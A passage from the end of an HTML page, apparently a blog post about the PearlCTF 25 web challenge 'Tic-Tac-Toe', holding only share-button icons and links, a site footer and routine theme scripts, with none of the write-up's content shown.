127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share PearlCTF 25 - Web/Tic-Tac-Toe on telegram" href="https://telegram.me/share/url?text=PearlCTF%2025%20-%20Web%2fTic-Tac-Toe&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fpearl25%2ftic-tac-toe%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share PearlCTF 25 - Web/Tic-Tac-Toe on ycombinator" href="https://news.ycombinator.com/submitlink?t=PearlCTF%2025%20-%20Web%2fTic-Tac-Toe&u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fpearl25%2ftic-tac-toe%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hxuu.github.io/blog/>hxuu</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>